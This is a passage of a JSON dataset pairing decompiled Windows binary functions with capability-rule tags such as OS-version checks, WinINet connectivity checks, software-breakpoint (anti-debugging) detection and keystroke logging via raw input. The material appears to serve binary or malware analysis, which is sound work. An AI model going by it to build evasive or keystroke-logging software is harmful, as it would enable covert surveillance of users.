code_r0x0040f14f;\n                    iVar3 = (*piVar4)(arg_8h, arg_10h, arg_14h, arg_ch[1]);\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                    if ((piVar2 != NULL) && (iVar3 < 0)) {\n                        return iVar3;\n                    }\n                }\n                ppiVar1 = arg_ch + 5;\n                arg_ch = arg_ch + 3;\n                piVar4 = *ppiVar1;\n            }\n            iVar3 = -0x7fffbffe;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 530
    },
    "0040f2fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f2fb(uint *param_1)\n\n{\n    if (param_1[1] != 0) {\n        *(param_1[1] + 0xec) = *param_1;\n        *(param_1[1] + 0xf0) = param_1[2];\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0040f3f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f3f6(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    if (param_2 == 0) {\n        puVar1 = param_1 + 0x12;\n    }\n    else {\n        puVar1 = param_1 + 0x18;\n    }\n    if (*puVar1 == 0xffff) {\n        puVar1 = puVar1 + 2;\n    }\n    else {\n        do {\n            uVar2 = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (uVar2 != 0);\n    }\n    if (*puVar1 == 0xffff) {\n        puVar1 = puVar1 + 2;\n    }\n    else {\n        do {\n            uVar2 = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (uVar2 != 0);\n    }\n    uVar2 = *puVar1;\n    if ((uVar2 != 0) && (param_2 == 0)) {\n        uVar2 = uVar2 - 2;\n    }\n    return puVar1 + uVar2 + 5 & 0xfffffffc;\n}\n",
        "token_count": 289
    },
    "0040f8c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f8c8(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    \n    iVar3 = arg_8h;\n    if (*(arg_8h + 0x48) != 0) {\n        arg_8h = *(*(arg_8h + 0x48) + 0x40);\n        while (arg_8h != 0) {\n            piVar4 = fcn.0040e765(&arg_8h);\n            iVar2 = *piVar4;\n            if (*(iVar2 + 4) != 0) {\n                iVar5 = *(*(iVar2 + 4) + 0x90);\n                while (iVar5 != 0) {\n                    fcn.00412ae5(*(iVar2 + 4));\n                    if (*(iVar5 + 4) != 0) {\n                        iVar5 = fcn.0042eb82(*(iVar5 + 4));\n                        fcn.004144d9(*(iVar5 + 0x4c));\n                    }\n                    iVar5 = fcn.00412aee();\n                }\n                iVar1 = *(*(iVar2 + 4) + 0x94);\n                if (iVar1 != 0) {\n                    iVar5 = fcn.0042eb82(iVar1);\n                    (**(**(iVar5 + 0x4c) + 0xb4))();\n                    *(*(iVar2 + 4) + 0x94) = *(iVar5 + 0x4c);\n                    (**(**(*(iVar5 + 0x4c) + 0x8c) + 8))(*(iVar2 + 4), 1);\n                }\n            }\n        }\n        arg_8h = *(*(iVar3 + 0x48) + 0x40);\n        while (arg_8h != 0) {\n            piVar4 = fcn.0040e765(&arg_8h);\n            iVar3 = *(*piVar4 + 4);\n            if ((iVar3 != 0) && (*(iVar3 + 0x8c) != 0)) {\n                (**(**(iVar3 + 0x8c) + 0xc))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 520
    },
    "0040fa3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0040fa3c(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    iVar2 = *param_2;\n    piVar1 = iVar2 + -0x10;\n    piVar3 = *param_1 + -0x10;\n    if (piVar1 != piVar3) {\n        if ((*(*param_1 + -4) < 0) || (*piVar1 != *piVar3)) {\n            fcn.00402860(iVar2, *(iVar2 + -0xc));\n        }\n        else {\n            iVar2 = fcn.00401d40(piVar1);\n            fcn.004014f0();\n            *param_1 = iVar2 + 0x10;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 208
    },
    "00410918": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nbool fcn.00410918(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    piVar3 = extraout_ECX + 0x12;\n    iVar1 = *piVar3;\n    *(unaff_EBP + -0x10) = &var_14h;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    if (((iVar1 == 0) && (iVar1 = (**(*extraout_ECX + 0x124))(piVar3),  iVar1 != 0)) && (*piVar3 == 0)) {\n        *(unaff_EBP + -4) = 0;\n        iVar1 = fcn.00438818();\n        iVar1 = (**(**(iVar1 + 0x1038) + 8))(extraout_ECX);\n        *piVar3 = iVar1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    piVar3 = extraout_ECX;\n    if (extraout_ECX[0x12] != 0) {\n        while ((piVar3[0xe] & 0x100U) == 0) {\n            piVar3[0xe] = piVar3[0xe] | 0x100;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(piVar3[7]);\n            piVar3 = fcn.0042cb01(uVar2);\n            piVar4 = piVar3;\n            if (piVar3 != NULL) {\n                piVar4 = piVar3[7];\n            }\n            uVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(piVar4, 0xfffffff0);\n            if (((uVar5 & 0x40000000) == 0) || (piVar3 == NULL)) break;\n        }\n    }\n    iVar1 = extraout_ECX[0x12];\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1 != 0;\n}\n",
        "token_count": 562
    },
    "004109d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.004109d8(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.COleControlContainer.0;\n    pcVar1 = extraout_ECX[0x10];\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x10) = pcVar1;\n    while (pcVar1 != NULL) {\n        *(unaff_EBP + -0x14) = pcVar1;\n        piVar3 = fcn.0040e765();\n        iVar4 = *piVar3;\n        iVar2 = *(iVar4 + 4);\n        if ((iVar2 != 0) && (*(iVar2 + 0x8c) == 0)) {\n            fcn.0042a227();\n            fcn.004105cc();\n            fcn.0042f834(iVar4);\n        }\n        pcVar1 = *(unaff_EBP + -0x10);\n    }\n    pcVar1 = extraout_ECX[0x12];\n    while (pcVar1 != NULL) {\n        iVar4 = fcn.0042a203();\n        if (iVar4 != 0) {\n            fcn.004105cc();\n            fcn.0042f834(iVar4);\n        }\n        pcVar1 = extraout_ECX[0x12];\n    }\n    fcn.0042a60e();\n    fcn.004397fa(extraout_ECX + 0x18);\n    *(unaff_EBP + -4) = 1;\n    fcn.0042a2a9();\n    *(unaff_EBP + -4) = 0;\n    fcn.0042a7ac();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042f31c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 588
    },
    "00410deb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410deb(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    var_4h = *(in_ECX + 0x40);\n    while (var_4h != 0) {\n        piVar1 = fcn.0040e765(&var_4h);\n        if (*(*piVar1 + 4) != 0) {\n            fcn.00411fa9(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "004117a2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004117a2(int32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    if (*(param_1 + 0x1c) == '\\0') {\n        iVar1 = *(*(param_1 + 0x14) + 8);\n        in_EAX = *param_2;\n        if (in_EAX <= *(param_1 + 0xc) + -1 + iVar1) {\n            in_EAX = in_EAX - iVar1;\n            *param_2 = in_EAX;\ncode_r0x004117ee:\n            return CONCAT31(in_EAX >> 8, 1);\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (*(param_1 + 0xc) != 0) {\n            in_EAX = *param_2;\n            puVar2 = *(param_1 + 0x14) + 8;\n            do {\n                if (*puVar2 == in_EAX) {\n                    *param_2 = uVar3;\n                    goto code_r0x004117ee;\n                }\n                uVar3 = uVar3 + 1;\n                puVar2 = puVar2 + 0xc;\n            } while (uVar3 < *(param_1 + 0xc));\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 333
    },
    "00411c33": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411c33(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    if ((*(in_ECX + 0x4c) != 0) && (iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x443dfc, &var_8h),  -1 < iVar1)) {\n        var_4h = NULL;\n        var_ch = 0;\n        iVar1 = (**(*var_8h + 0x10))(var_8h, arg_8h, &var_4h);\n        if (-1 < iVar1) {\n            (**(*var_4h + 0x14))(var_4h, arg_ch, &var_ch);\n            (**(*var_4h + 8))(var_4h);\n        }\n        (**(*var_8h + 8))(var_8h);\n        return var_ch;\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "00411c9d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411c9d(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    if ((arg_ch != 0) && (in_ECX[0x13] != 0)) {\n        var_8h = in_ECX;\n        iVar1 = (***in_ECX[0x13])(in_ECX[0x13], 0x443dfc, &var_8h);\n        if (-1 < iVar1) {\n            var_4h = NULL;\n            iVar1 = (**(*var_8h + 0x10))(var_8h, arg_8h, &var_4h);\n            if (-1 < iVar1) {\n                (**(*var_4h + 0x18))(var_4h, arg_ch);\n                (**(*var_4h + 8))(var_4h);\n            }\n            (**(*var_8h + 8))(var_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "00411cfd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00411cfd(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    *arg_8h = *0x443c2c;\n    arg_8h[1] = *0x443c30;\n    arg_8h[2] = *0x443c34;\n    arg_8h[3] = *0x443c38;\n    var_ch = NULL;\n    iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x443dcc, &var_ch);\n    if (-1 < iVar1) {\n        (**(*var_ch + 0x10))(var_ch, 1, arg_8h);\n        (**(*var_ch + 8))(var_ch);\n    }\n    var_14h = NULL;\n    iVar1 = fcn.0040f1d0(arg_8h, 0x443c2c);\n    if ((iVar1 != 0) && (iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x443ddc, &var_14h),  -1 < iVar1)) {\n        var_4h = NULL;\n        iVar1 = (**(*var_14h + 0xc))(var_14h, &var_4h);\n        if (-1 < iVar1) {\n            iVar1 = (**(*var_4h + 0xc))(var_4h, &var_10h);\n            if (-1 < iVar1) {\n                uVar2 = 0;\n                if (*(var_10h + 0x30) != 0) {\n                    do {\n                        iVar1 = (**(*var_4h + 0x24))(var_4h, uVar2, &var_1ch);\n                        if ((-1 < iVar1) && ((var_1ch & 7) == 3)) {\n                            var_8h = NULL;\n                            iVar1 = (**(*var_4h + 0x20))(var_4h, uVar2, &var_20h);\n                            if ((-1 < iVar1) && (iVar1 = (**(*var_4h + 0x38))(var_4h, var_20h, &var_8h),  -1 < iVar1)) {\n                                iVar1 = (**(*var_8h + 0xc))(var_8h, &var_18h);\n                                if (-1 < iVar1) {\n                                    *arg_8h = *var_18h;\n                                    arg_8h[1] = var_18h[1];\n                                    arg_8h[2] = var_18h[2];\n                                    arg_8h[3] = var_18h[3];\n                                    (**(*var_8h + 0x4c))(var_8h, var_18h);\n                                }\n                                (**(*var_8h + 8))(var_8h);\n                            }\n                            break;\n                        }\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < *(var_10h + 0x30));\n                }\n                (**(*var_4h + 0x4c))(var_4h, var_10h);\n            }\n            (**(*var_4h + 8))(var_4h);\n        }\n        (**(*var_14h + 8))(var_14h);\n    }\n    iVar1 = fcn.0040f1d0(arg_8h, 0x443c2c);\n    return iVar1 == 0;\n}\n",
        "token_count": 883
    },
    "0041201c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041201c(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(param_1 + 0x24);\n    *(param_1 + 0x20) = 0;\n    if (piVar1 != NULL) {\n        if (piVar1[7] != 0) {\n            piVar1 = (**(*piVar1 + 0xf0))();\n            iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(*(param_1 + 0x24) + 0x1c));\n            if ((iVar2 != 0) && (*piVar1 != 0)) {\n                fcn.0042d16e();\n            }\n            fcn.0042cb7b();\n        }\n        *(*(param_1 + 0x24) + 0x4c) = 0;\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0041206a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041206a(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x24) != 0) &&\n       (iVar1 = (**(**(param_1 + 0x24) + 0xc))(*(param_1 + 0x28), 0xfffffffe, param_2, 0),  iVar1 != 0)) {\n        return 1;\n    }\n    uVar2 = (**(**(*(param_1 + 0x1c) + 0x1c) + 0xc))(*(param_1 + 0x28), 0xfffffffe, param_2, 0);\n    return uVar2;\n}\n",
        "token_count": 175
    },
    "00412af2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00412af2(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    (**(**(param_1 + 0xc) + 0xb4))();\n    (**(**(*(param_1 + 0xc) + 0x8c) + 4))(param_1, 1);\n    // WARNING: Could not recover jumptable at 0x00412b27. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (****(*(param_1 + 0xc) + 0x8c))();\n    return uVar1;\n}\n",
        "token_count": 163
    },
    "00413c9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413c9a(int32_t **param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t **var_4h;\n    \n    if ((param_1[2] != 0x80010001) && (*param_1 != NULL)) {\n        puVar1 = (*param_1)[0x13];\n        var_4h = param_1;\n        iVar2 = (***puVar1)(puVar1, 0x443bdc, &var_4h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.00412af2();\n            if (iVar2 != 0) {\n                uVar3 = 0xd;\n                if (param_1[3][0x23] != 0) {\n                    uVar3 = 0x800d;\n                }\n                (**(**param_1 + 0x70))(*param_1, param_1[2], uVar3, iVar2);\n            }\n        }\n        else {\n            (*(*var_4h)[3])(var_4h, param_1[2], param_1[3] != NULL, param_1 + 4);\n            (*(*var_4h)[2])(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "00413df1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00413df1(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar1 = *(*(param_1 + 8) + 4);\n    iVar2 = 0;\n    uVar3 = 0;\n    if (uVar1 != 0) {\n        do {\n            if ((*(**(param_1 + 8) + 4 + uVar3 * 8) != '\\0') && (iVar2 = fcn.00412c68(uVar3),  iVar2 < 0)) {\n                return iVar2;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 182
    },
    "0041418f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0041418f(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint unaff_ESI;\n    uint noname_2;\n    uint *noname_3;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    fcn.00413e25();\n    noname_3 = &var_4h;\n    noname_2 = 0x440ad4;\n    iVar1 = (***arg_8h)();\n    if (-1 < iVar1) {\n        if (*in_ECX == 0) {\n            iVar1 = fcn.00411596(1, arg_8h, noname_2, noname_3, unaff_ESI, var_4h);\n            if (iVar1 < 0) goto code_r0x004141e1;\n            *(*in_ECX + 4) = 1;\n        }\n        iVar1 = fcn.004115fa(in_ECX[3], in_ECX[4], *in_ECX, in_ECX[6], var_4h);\n    }\ncode_r0x004141e1:\n    fcn.00412e28();\n    return iVar1;\n}\n",
        "token_count": 297
    },
    "004149a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004149a9(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            if ((*(in_ECX + 0x10) == 0) || (*(*(in_ECX + 0x10) + var_4h) != '\\x01')) {\n                iVar2 = *(iVar4 + 0x14 + *(in_ECX + 0x14));\n                if ((iVar2 == 0xd) || (iVar2 == 9)) {\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    if (*((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(in_ECX + 8)) != 0)\n                    goto code_r0x00414a76;\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    arg_ch = *(iVar3 + 4) + *(in_ECX + 8);\n                }\n                else {\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    arg_ch = *(iVar3 + 4) + *(in_ECX + 8);\n                }\n                fcn.00414904(*(iVar3 + 0x14), arg_ch, arg_8h);\n            }\n            else {\n                iVar3 = *(in_ECX + 0x14) + iVar4;\n                if (((*((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(in_ECX + 8)) != 3) &&\n                    (piVar1 = *(iVar4 + 4 + *(in_ECX + 0x14)) + *(in_ECX + 8),  piVar1 != NULL)) && (*piVar1 != 0)) {\n                    (*_sym.imp.ole32.dll_CoTaskMemFree)(*piVar1);\n                    *piVar1 = 0;\n                }\n            }\ncode_r0x00414a76:\n            var_4h = var_4h + 1;\n            iVar4 = iVar4 + 0x30;\n        } while (var_4h < *(in_ECX + 0xc));\n    }\n    return;\n}\n",
        "token_count": 584
    },
    "004152f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004152f2(int32_t *arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    fcn.00413e25();\n    var_20h = (***arg_8h)(arg_8h, 0x440ac4, &var_24h);\n    uVar1 = arg_14h;\n    uVar2 = arg_14h;\n    puVar5 = arg_10h;\n    if (arg_14h != 0) {\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    if (-1 < var_20h) {\n        arg_14h = 0;\n        fcn.004148a8();\n        var_1ch = arg_ch;\n        var_18h = uVar1;\n        var_14h = *0x4443e0;\n        uStack20 = *0x4443e4;\n        uStack16 = *0x4443e8;\n        uStack12 = *0x4443ec;\n        var_20h = (**(*var_24h + 0xc))(var_24h, 1, &var_1ch, &arg_14h, &arg_8h);\n        if (-1 < var_20h) {\n            uVar2 = 0;\n            iVar4 = 0;\n            while( true ) {\n                uVar3 = arg_8h[1];\n                if (uVar1 <= arg_8h[1]) {\n                    uVar3 = uVar1;\n                }\n                if (uVar3 <= uVar2) break;\n                arg_10h[uVar2] = *(*arg_8h + 0x2c + iVar4);\n                uVar2 = uVar2 + 1;\n                iVar4 = iVar4 + 0x34;\n            }\n            if (*arg_8h != 0) {\n                (*_sym.imp.ole32.dll_CoTaskMemFree)(*arg_8h);\n            }\n        }\n        fcn.00414a8f();\n    }\n    fcn.00412e28();\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 634
    },
    "004153ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n\nvoid fcn.004153ca(void)\n\n{\n    uint8_t uVar1;\n    code **ppcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t *extraout_ECX;\n    int32_t arg_2ch;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint32_t arg_24h;\n    uint *puVar7;\n    uint unaff_EDI;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_3ch;\n    uint var_24h;\n    uint var_14h;\n    uint var_10h;\n    uint uVar11;\n    uint var_5ch;\n    uint var_58h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3dh;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_14h_2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    uVar11 = *0x44d270;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x24) = *0x440c2c;\n    *(unaff_EBP + -0x20) = *0x440c30;\n    *(unaff_EBP + -0x1c) = *0x440c34;\n    *(unaff_EBP + -0x14) = uVar11;\n    *(unaff_EBP + -0x10) = &var_5ch;\n    *(unaff_EBP + -0x48) = extraout_ECX;\n    *(unaff_EBP + -0x18) = *0x440c38;\n    *(unaff_EBP + -0x3d) = 0;\n    ppcVar2 = **(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    iVar10 = unaff_EBP + -0x3c;\n    uVar11 = 0x440ad4;\n    var_5ch = unaff_EDI;\n    var_58h = unaff_ESI;\n    iVar4 = (**ppcVar2)(*(unaff_EBP + 8));\n    if (-1 < iVar4) {\n        iVar4 = extraout_ECX[5];\n        *(unaff_EBP + -0x2c) = 0;\n        if (iVar4 == 0) {\n            *(unaff_EBP + -0x28) = 0;\n            ppcVar2 = **(unaff_EBP + 8);\n            *(unaff_EBP + -4) = 1;\n            iVar4 = (**ppcVar2)(*(unaff_EBP + 8), 0x440ab4, unaff_EBP + -0x28);\n            *(unaff_EBP + -0x38) = iVar4;\n            piVar6 = *(unaff_EBP + -0x28);\n            if (iVar4 < 0) {\n                *(unaff_EBP + -4) = 0;\n                if (piVar6 != NULL) {\n                    (**(*piVar6 + 8))(piVar6);\n                }\n                piVar6 = *(unaff_EBP + -0x3c);\n                *(unaff_EBP + -4) = 0xffffffff;\n                goto code_r0x0041589f;\n            }\n            iVar4 = (**(*piVar6 + 0xc))(piVar6, 